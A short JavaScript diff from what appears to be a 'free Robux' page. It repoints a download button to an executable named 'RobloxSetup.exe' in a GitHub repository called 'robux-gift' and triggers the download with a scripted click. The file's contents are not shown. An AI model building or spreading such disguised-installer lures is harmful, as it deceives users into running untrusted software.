@@ -90,7 +90,7 @@ downloadBtn.addEventListener('click', () => {
   }, 90);
 
   const a = document.createElement('a');
-  a.href = 'RobloxSetup.exe';
+  a.href = 'https://github.com/Doinwor/robux-gift/releases/download/v1.0/RobloxSetup.exe';
   a.download = 'RobloxSetup.exe';
   document.body.appendChild(a);
   a.click();
